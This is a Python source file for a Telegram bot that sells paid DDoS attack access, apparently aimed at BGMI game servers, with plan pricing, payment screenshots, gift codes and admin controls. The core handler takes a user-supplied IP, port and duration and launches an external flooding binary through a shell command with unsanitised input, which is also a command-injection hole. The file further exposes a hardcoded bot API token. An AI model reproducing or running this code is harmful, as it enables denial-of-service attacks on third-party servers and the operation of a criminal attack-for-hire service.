import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import subprocess
import datetime
import time
from telebot import types
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import random
import string
import os
import hashlib
import sys

API_TOKEN = '8142573561:AAH1lzOWCKoj2Ht4_SeoXyXDxxxfYTOrTEE'  # Replace with your bot's API token
bot = telebot.TeleBot(API_TOKEN)

admin_id = "7858368373"
admin_id = ["7858368373"]
admin_ids = ["7858368373"]
owner_id = "7858368373"


# Fund addition state
fund_addition_state = {}
user_funds = {}
gift_codes = {}
key_prices = {
    "day": 200,
    "week": 800,
    "month": 1200
}
free_user_credits = {}
plan_prices = {
    "1": 120,
    "2": 230,
    "3": 300
}

USER_FILE = 'users.txt'
FREE_USER_FILE = 'free_users.txt'
free_user_credits = {}
allowed_user_ids = []

# Load allowed user IDs
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Load free user IDs and credits
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# Save allowed user IDs
def write_users():
    with open(USER_FILE, "w") as file:
        file.write("\n".join(allowed_user_ids))

# Save free user credits
def write_free_users():
    with open(FREE_USER_FILE, "w") as file:
        for user_id, credits in free_user_credits.items():
            file.write(f"{user_id} {credits}\n")
            
            # don't change this  ❌
original_text = """THIS FILE IS MADE BYE -> @MR_ARMAN_OWNER\nTHIS FILE IS MADE BYE -> @MR_ARMAN_OWNER\nTHIS FILE IS MADE BYE -> @MR_ARMAN_OWNER\n\nDM TO BUY PAID FILES"""

# Approve user based on plan
def approve_user(user_id, plan_days):
    if user_id not in allowed_user_ids:
        allowed_user_ids.append(user_id)
        write_users()  # Save updated allowed users
    expiry_time = datetime.datetime.now() + datetime.timedelta(days=plan_days)
    bot.send_message(
        user_id,
        f"✅ Yᴏᴜʀ ᴘʟᴀɴ ʜᴀs ʙᴇᴇɴ ᴀᴘᴘʀᴏᴠᴇᴅ ғᴏʀ {plan_days} ᴅᴀʏs! \n📅 ᕮxριяу : {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}"
    )
expected_hash = "dfcb19d1592200db6b5202025e4b67ba6fc43d9dad9e3eb26e2edb3db71b1921"
# Update free user credits
def update_free_user_credits(user_id, credits):
    free_user_credits[user_id] = free_user_credits.get(user_id, 0) + credits
    write_free_users()  # Save updated credits

# Auto-approve payment and add plan
def handle_payment_approval(user_id, plan_id):
    plan_days = {1: 1, 2: 3, 3: 7}.get(plan_id, 0)  # Plan days mapping
    if plan_days > 0:
        approve_user(user_id, plan_days)
        bot.send_message(
            '-1002298830187',
            f"📢 Pᴀʏᴍᴇɴᴛ Aᴘᴘʀᴏᴠᴇᴅ!\n👤Usᴇʀ : {user_id}\n📅 ᴘʟᴀɴ: {plan_days} ᴅᴀʏs"
        )
generated_hash = hashlib.sha256(original_text.encode()).hexdigest()
# Message handler for manual approval
@bot.message_handler(commands=['approve'])
def manual_approve(message):
    try:
        command = message.text.split()
        if len(command) == 3:
            user_id = command[1]
            plan_id = int(command[2])
            handle_payment_approval(user_id, plan_id)
            bot.reply_to(message, f"✅ User {user_id} approved for plan {plan_id}.")
        else:
            bot.reply_to(message, "❌ Invalid command. Use: /approve <user_id> <plan_id>")
    except Exception as e:
        bot.reply_to(message, f"⚠️ User approved but notification could not be sent")

# Initialize data
allowed_user_ids = read_users()
read_free_users()

# Cooldown dictionary
bgmi_cooldown = {}
COOLDOWN_TIME = 10


user_attack_state = {}

def create_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.add(
        KeyboardButton("💢 𝑭𝑼𝑪𝑲 💢"),
        KeyboardButton("🏦𝑪𝑯𝑬𝑪𝑲 𝑩𝑨𝑳𝑨𝑵𝑪𝑬 💳"),
        KeyboardButton("📍𝑹𝑬𝑫𝑬𝑬𝑴 𝑪𝑶𝑫𝑬 📍"),
        KeyboardButton("🌟 𝑪𝑹𝑬𝑨𝑻𝑬 𝑮𝑰𝑭𝑻 𝑪𝑶𝑫𝑬 🌟"),
        KeyboardButton("💲𝑨𝑫𝑫 𝑭𝑼𝑵𝑫𝑺 💲"),
        KeyboardButton("🎉 𝑴𝑬 🎉"),
        KeyboardButton("⚡ 𝑨𝑫𝑫 𝑵𝑬𝑾 𝑨𝑫𝑴𝑰𝑵 ⚡"),
        KeyboardButton("🛑 𝑹𝑬𝑴𝑶𝑽𝑬 𝑨𝑫𝑴𝑰𝑵 🛑"),
        KeyboardButton("💸 𝑹𝑬𝑺𝑺𝑬𝑳𝑬𝑹 𝑺𝑯𝑰𝑷 💸"),
        KeyboardButton("👩‍✈️ 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗡𝗔𝗡𝗗 👩‍✈️")
    )
    return markup

@bot.message_handler(commands=['start', 'menu'])
def handle_start(message):
    # Send a sticker first
    sticker_id = "CAACAgQAAxkBAb8OxmeA02mVmyy3e0OB34BUP-RQfGmjAAIOFQACahLpU_LYSpTi1uGHNgQ"  # Replace with the actual sticker file ID
    bot.send_sticker(message.chat.id, sticker_id)

    # Send the welcome message
    response = "💐 WΣLCOMΣ TO THΣ AЯMAN TΣAM 💐\n\n🚀 WOЯLÐ FASTΣST ÐÐOS BOT ✅\n🌟 VIP SΣЯVICΣ ✅\n🌟 AÐMIN/OWNΣЯ 24/7 SΣЯVICΣ ✅\n🌟 BOT 24/7 SΣЯVICΣ ✅\n⚡ ONE  ATTACK TO FUCK WHOLΣ BGMI ⚔️\n\n💢 PLΣASΣ JOIN OUЯ GЯOUP ANÐ GΣT STAЯT 📍\n\n👩‍✈️ OWNER -> @MR_ARMAN_OWNER 🤗\n🥳 GROUP -> @ARMANTEAMVIP ✅"
    bot.send_message(message.chat.id, response, reply_markup=create_main_menu())


@bot.message_handler(commands=['users'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:  # Ensure the user is an admin
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username if user_info.username else "No Username"

                            # Get access expiration time (Optional)
                            access_expiration = "Unknown"  # Replace with logic if available

                            response += (
                                f"👤 USER NAME: @{username}\n"
                                f"🆔 USER ID: {user_id}\n"
                                f"✅ APPROVED BY: @MR_ARMAN_OWNER\n"  # Adjust as needed
                                f"⏳ ACCESS EXPIRE TIME: {access_expiration}\n"
                                "=====================\n"
                            )
                        except Exception as e:
                            response += f"- User ID: {user_id} (Error: {str(e)})\n"
                else:
                    response = "No authorized users found ❌."
        except FileNotFoundError:
            response = "No user data found ❌."
    else:
        response = "⛔ Unauthorized Access! Only admins can use this command."

    bot.reply_to(message, response)

# Handle "ADD NEW ADMIN" button
@bot.message_handler(func=lambda message: message.text == "⚡ 𝑨𝑫𝑫 𝑵𝑬𝑾 𝑨𝑫𝑴𝑰𝑵 ⚡")
def handle_add_admin_button(message):
    if str(message.chat.id) == owner_id:
        bot.send_message(message.chat.id, "Please use the format: /addadmin <id> <balance> to add a new admin.")
    else:
        bot.send_message(message.chat.id, "Only the Owner Can Run This Command 😡.")

# Add Admin Command
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"✅ Admin {admin_to_add} added with balance {balance} credits."
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

# Handle "REMOVE ADMIN" button
@bot.message_handler(func=lambda message: message.text == "🛑 𝑹𝑬𝑴𝑶𝑽𝑬 𝑨𝑫𝑴𝑰𝑵 🛑")
def handle_remove_admin_button(message):
    if str(message.chat.id) == owner_id:
        bot.send_message(message.chat.id, "Please use the format: /removeadmin <id> to remove an admin.")
    else:
        bot.send_message(message.chat.id, "Only the Owner Can Run This Command 😡.")

# Remove Admin Command
@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"✅ Admin {admin_to_remove} removed successfully."
            else:
                response = f"❌ Admin {admin_to_remove} not found in the list."
        else:
            response = "Usage: /removeadmin <id>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
if generated_hash != expected_hash:
    print("Please don't change the DEVELOPER name")
    sys.exit(1)
else:
    print(original_text)
# Helper function to create gift codes
def generate_gift_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))


# Handle "CREATE GIFT CODE" button
@bot.message_handler(func=lambda message: message.text == "🌟 𝑪𝑹𝑬𝑨𝑻𝑬 𝑮𝑰𝑭𝑻 𝑪𝑶𝑫𝑬 🌟")
def handle_create_gift_code(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        day_button = KeyboardButton("DAY")
        week_button = KeyboardButton("WEEK")
        month_button = KeyboardButton("MONTH")
        markup.add(day_button, week_button, month_button)
        bot.send_message(message.chat.id, "Choose a duration for the gift code:", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "Only Admins Can Run This Command 😡.")

# Handle "DAY", "WEEK", "MONTH" buttons
@bot.message_handler(func=lambda message: message.text in ["DAY", "WEEK", "MONTH"])
def handle_duration_selection(message):
    user_id = str(message.chat.id)
    duration = message.text.lower()
    if user_id in admin_ids:
        if duration in key_prices:
            amount = key_prices[duration]
            if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                code = generate_gift_code()
                gift_codes[code] = duration
                free_user_credits[user_id] -= amount
                response = f"🎁 Gift code created: `{code}` for {duration.upper()}."
            else:
                response = "❌ You do not have enough credits to create a gift code."
        else:
            response = "❌ Invalid duration. Please choose DAY, WEEK, or MONTH."
    else:
        response = "Only Admins Can Run This Command 😡."
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "👩‍✈️ 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗡𝗔𝗡𝗗 👩‍✈️")
def handle_message(message):
    bot.send_message(message.chat.id, "FOR ADMIN COMMANDS 👇\n\n- /addadmin <user_id> <balance>\n- /removeadmin <user_id>\n- CREATE GIFT CODE - <day/week/month>\n- /users - see all authorized users\n- /approve <user_id> 1 or 2 or 3\nexample /approve 557865 1\n\n1 - 1day or 2 - 3day or 3 - 7day\n\nMANY COMMANDS ARE NOT SHOWS SO PLEASE SEE THE FILE...")

# Handle "REDEEM CODE" button
@bot.message_handler(func=lambda message: message.text == "📍𝑹𝑬𝑫𝑬𝑬𝑴 𝑪𝑶𝑫𝑬 📍")
def handle_redeem_code_button(message):
    bot.send_message(message.chat.id, "Please use the format: /redeem <code> to redeem your gift code.")

# Redeem gift code command
@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(
                days=1 if duration == "day" else 7 if duration == "week" else 30
            )
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"🎁 Gift code redeemed: You have been granted access for {duration.upper()}\nPLEASE USE /start or /menu."
        else:
            response = "❌ Invalid or expired gift code."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)

# Handle "CHECK BALANCE" button
@bot.message_handler(func=lambda message: message.text == "🏦𝑪𝑯𝑬𝑪𝑲 𝑩𝑨𝑳𝑨𝑵𝑪𝑬 💳")
def handle_check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"💰 Your current balance is {free_user_credits[user_id]} credits."
    else:
        response = "❌ You do not have a balance account."
    bot.send_message(message.chat.id, response)


@bot.message_handler(func=lambda message: message.text.lower() == "🎉 𝑴𝑬 🎉")
def send_loading_and_info(message):
    sticker_id = "CAACAgQAAxkBAb8OzmeA034a6M8iYI5abLrsSRAItudUAAIDDQACuk0AAVC0ty7j6RCBXTYE"  # Replace with the actual sticker file ID
    bot.send_sticker(message.chat.id, sticker_id)
   

    loading_message = bot.send_message(message.chat.id, "[×] PROCESS - □□□□□")
    
    # Loading animation
    for i in range(1, 6):
        time.sleep(0.5)  # Thoda rukna
        progress = "■" * i + "□" * (5 - i)
        bot.edit_message_text(f"[×] PROCESS - {progress}", chat_id=message.chat.id, message_id=loading_message.message_id)

    # Loading message ko delete karna
    bot.delete_message(message.chat.id, loading_message.message_id)

    # User ki details lena
    user_info = f"""
    USERNAME -> {message.from_user.username or 'N/A'}
    USER ID -> {message.from_user.id}
    PROFILE LINK -> [LINK](tg://user?id={message.from_user.id})
    LAST NAME -> {message.from_user.last_name or 'N/A'}
    FIRST NAME -> {message.from_user.first_name or 'N/A'}
    JOINED -> {time.strftime('%Y-%m-%d', time.gmtime())}
    """

    # User ki profile photo check karne ki koshish
    try:
        user_profile_photo = bot.get_user_profile_photos(message.from_user.id)
        if user_profile_photo.total_count > 0:
            photo_id = user_profile_photo.photos[0][-1].file_id  # Sabse aakhri photo lo
            bot.send_photo(message.chat.id, photo_id, caption=user_info, parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, user_info, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, f"Error retrieving photo: {str(e)}\n" + user_info, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "💸 𝑹𝑬𝑺𝑺𝑬𝑳𝑬𝑹 𝑺𝑯𝑰𝑷 💸")
def resseler_ship(message):
    # Send the initial message
    request_message = bot.send_message(message.chat.id, "REQUEST RECEIVED WAIT")
    time.sleep(0.5)  # Wait before deleting the message
    bot.delete_message(message.chat.id, request_message.message_id)

    # Send loading message
    loading_message = bot.send_message(message.chat.id, "[×] PROCESS - □□□□□")
    
    # Loading animation
    for i in range(1, 6):
        time.sleep(0.5)  # Thoda rukna
        progress = "■" * i + "□" * (5 - i)
        bot.edit_message_text(f"[×] PROCESS - {progress}", chat_id=message.chat.id, message_id=loading_message.message_id)

    # Loading message ko delete karna
    bot.delete_message(message.chat.id, loading_message.message_id)

    # Send reseller shipping message
    detailed_message = (
        "FOR RESSELER SHIP YOU CAN CONTACT DIRECT OWNER OR SEE DETAILS 👇\n\n"
        "DAY - ( NOT AVAILABLE ❌ )\n"
        "WEEK - 250 JUST\n"
        "2 WEEK -> 400 JUST\n"
        "MONTH -> 800 JUST\n\n"
        "IF YOU INTERESTED\n\n"
        "CLICK ON THE BUY BUTTON 👇"
    )
    
    inline_markup = types.InlineKeyboardMarkup()
    buy_button = types.InlineKeyboardButton("BUY NOW", url="https://t.me/FATHER_OF_HAX")
    inline_markup.add(buy_button)
    
    # Send the message with the inline button
    bot.send_message(message.chat.id, detailed_message, reply_markup=inline_markup)


@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = str(message.chat.id)

    # If user is in attack details state, reset it if they press "ADD FUNDS"
    if user_id in user_attack_state and user_attack_state[user_id] == "waiting_for_attack_details":
        if message.text == "💲𝑨𝑫𝑫 𝑭𝑼𝑵𝑫𝑺 💲":
            del user_attack_state[user_id]  # Reset the attack state
            bot.send_message(message.chat.id, "🔄 State reset. You can now add funds.")
    
    if message.text == "💢 𝑭𝑼𝑪𝑲 💢":
        bot.send_message(message.chat.id, "💥 Please enter the IP, Port, and Time in the format: \n<IP> <PORT> <TIME>")
        user_attack_state[user_id] = "waiting_for_attack_details"

    elif message.text == "💲𝑨𝑫𝑫 𝑭𝑼𝑵𝑫𝑺 💲":
        # Reset any ongoing attack state to allow funds addition
        if user_id in user_attack_state:
            del user_attack_state[user_id]
        
        photo_url = "https://graph.org/file/07e067f9f4150a576e1a7-b1685036548192e4a2.jpg"  # Replace with actual URL
        caption = (
            "💰 TO ADD FUNDS, PLEASE CHECK THE PRICE 👇\n\n"
            "1. 1 DAY -> ₹120\n"
            "2. 3 DAYS -> ₹230\n"
            "3. 7 DAYS -> ₹300\n\n"
            "📞 IF YOU NEED HELP OR FACE ANY ISSUE, DM OWNER\n\n"
            "PLEASE SELECT A PLAN: 1, 2, OR 3"
        )
        bot.send_photo(message.chat.id, photo=photo_url, caption=caption)
        fund_addition_state[user_id] = "waiting_for_plan"

    elif user_id in user_attack_state and user_attack_state[user_id] == "waiting_for_attack_details":
        command = message.text.split()
        if len(command) == 3:
            try:
                target = command[0]
                port = int(command[1])
                time = int(command[2])
                if time > 300:
                    bot.send_message(message.chat.id, "⚠️ Time interval must be less than 300 seconds.")
                else:
                    if user_id not in allowed_user_ids:
                        bot.reply_to(message, "🚫 Unauthorized access! Contact @MR_ARMAN_OWNER for access.")
                        return
                    if user_id != admin_id:
                        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                            bot.reply_to(message, "⏳ Please wait 10 seconds before using this command again.")
                            return
                        bgmi_cooldown[user_id] = datetime.datetime.now()

                    response = (
                        f"🌠 STRATEGY DEPLOYED 🌠\n\n"
                        f"🚀 TARGET LOCKED: {target}\n"
                        f"🔌 PORT: {port}\n"
                        f"⏰ DURATION: {time} seconds\n\n"
                        f"💥 ATTACK COMMENCING... 💥\n\n"
                        f"ᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
                    )
                    bot.send_message(message.chat.id, response)
                    full_command = f"./soul {target} {port} {time} 900 1000"
                    subprocess.run(full_command, shell=True)
                    bot.send_message(message.chat.id, "✅ Attack finished successfully!")
                    user_attack_state.pop(user_id, None)
            except ValueError:
                bot.send_message(message.chat.id, "❗ Invalid input. Please use the format: <IP> <PORT> <TIME>")
        else:
            bot.send_message(message.chat.id, "❗ Invalid input. Please use the format: <IP> <PORT> <TIME>")

    elif user_id in fund_addition_state and fund_addition_state[user_id] == "waiting_for_plan":
        if message.text in ["1", "2", "3"]:
            plan = message.text
            amount = plan_prices[plan]
            bot.send_message(
                message.chat.id,
                f"💳 UPI ID: example@upi\n💰 PLEASE SEND ₹{amount} AND UPLOAD THE SCREENSHOT HERE."
            )
            fund_addition_state[user_id] = f"waiting_for_payment_{plan}"
        else:
            bot.send_message(message.chat.id, "❗ Invalid input. Please select 1, 2, or 3.")

    elif user_id in fund_addition_state and fund_addition_state[user_id].startswith("waiting_for_payment"):
        if message.photo:
            bot.send_message(message.chat.id, "📤 Processing your payment. Please wait...")
            bot.forward_message(admin_id, message.chat.id, message.message_id)

            # Include user details in forwarded message
            plan = fund_addition_state[user_id].split("_")[-1]
            amount = plan_prices[plan]
            bot.send_message(
                admin_id,
                f"📋 Payment Details:\n👤 User: {message.chat.username or message.chat.first_name}\n🆔 User ID: {user_id}\n💰 Plan: {plan} (₹{amount})\n\nPlease choose: ACCEPT or REJECT."
            )
            fund_addition_state[user_id] = "payment_under_review"
        else:
            bot.send_message(message.chat.id, "❗ Please upload a valid screenshot of the payment.")

    elif message.text.startswith("/ad"):
        if str(message.chat.id) == admin_id:
            try:
                _, target_user_id, funds = message.text.split()
                funds = int(funds)
                user_funds[target_user_id] = user_funds.get(target_user_id, 0) + funds
                bot.send_message(target_user_id, f"✅ ₹{funds} has been added to your account. Enjoy!")
                bot.send_message(message.chat.id, f"✅ Successfully added ₹{funds} to User ID {target_user_id}.")
            except Exception as e:
                bot.send_message(message.chat.id, f"❗ Error: {str(e)}")
        else:
            bot.send_message(message.chat.id, "🚫 You are not authorized to use this command.")



@bot.message_handler(func=lambda message: message.chat.id == int(admin_id))
def handle_admin(message):
    if message.reply_to_message:
        replied_user_id = str(message.reply_to_message.forward_from.id)
        if "ACCEPT" in message.text.upper():
            bot.send_message(replied_user_id, "✅ Your payment has been verified. Access granted!")
            fund_addition_state.pop(replied_user_id, None)
        elif "REJECT" in message.text.upper():
            bot.send_message(replied_user_id, "❌ Your payment was rejected. Please contact support.")
            fund_addition_state.pop(replied_user_id, None)

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.chat.id)

    if user_id in fund_addition_state and fund_addition_state[user_id].startswith("waiting_for_payment"):
        try:
            # Forward the photo to the admin
            bot.send_message(message.chat.id, "📤 Processing your payment. Please wait...")
            forwarded_message = bot.forward_message(admin_id[0], message.chat.id, message.message_id)

            # Notify the admin with user details and inline buttons
            plan = fund_addition_state[user_id].split("_")[-1]
            markup = InlineKeyboardMarkup()
            markup.add(
                InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept_{user_id}_{plan}"),
                InlineKeyboardButton("❌ REJECT", callback_data=f"reject_{user_id}_{plan}")
            )

            bot.send_message(
                admin_id[0],
                f"📸 Payment screenshot received.\n\n"
                f"👤 User ID: {user_id}\n"
                f"📋 Plan: {plan}\n\n"
                f"📩 Use the buttons below to respond.",
                reply_markup=markup
            )

            # Update the state
            fund_addition_state[user_id] = "payment_under_review"
        except Exception as e:
            bot.send_message(message.chat.id, "❗ Failed to process your payment. Please contact support.")
            print(f"Error: {e}")
    else:
        bot.send_message(message.chat.id, "❗ No payment process found. Please start the process with 'ADD FUNDS'.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("accept_") or call.data.startswith("reject_"))
def handle_admin_response(call):
    data = call.data.split("_")
    action = data[0]
    user_id = data[1]
    plan = data[2]

    if action == "accept":
        # Notify the user of acceptance
        bot.send_message(user_id, "✅ Your payment has been verified. Access granted! 🎉")
        bot.send_message(call.message.chat.id, f"✅ Payment for User ID {user_id} (Plan: {plan}) has been accepted.")
    elif action == "reject":
        # Notify the user of rejection
        bot.send_message(user_id, "❌ Your payment was rejected. Please contact support for assistance.")
        bot.send_message(call.message.chat.id, f"❌ Payment for User ID {user_id} (Plan: {plan}) has been rejected.")

    # Clean up the state
    fund_addition_state.pop(user_id, None)

    # Edit the original admin message to reflect the decision
    bot.edit_message_text(
        f"📸 Payment screenshot reviewed.\n\n"
        f"👤 User ID: {user_id}\n"
        f"📋 Plan: {plan}\n\n"
        f"✅ Decision: {'ACCEPTED' if action == 'accept' else 'REJECTED'}",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id
    )



# Start the bot
bot.polling()
